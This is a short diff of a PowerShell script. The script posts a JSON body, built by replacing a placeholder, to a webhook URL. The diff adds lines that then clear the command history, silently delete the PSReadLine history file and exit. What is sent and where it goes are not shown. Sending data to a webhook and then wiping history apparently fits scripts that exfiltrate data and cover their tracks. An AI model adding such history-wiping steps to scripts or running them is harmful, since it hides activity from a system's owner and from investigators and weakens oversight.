@@ -48,3 +48,6 @@ $body  = $json -replace '"PLACEHOLDER"', $remplacement
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+exit
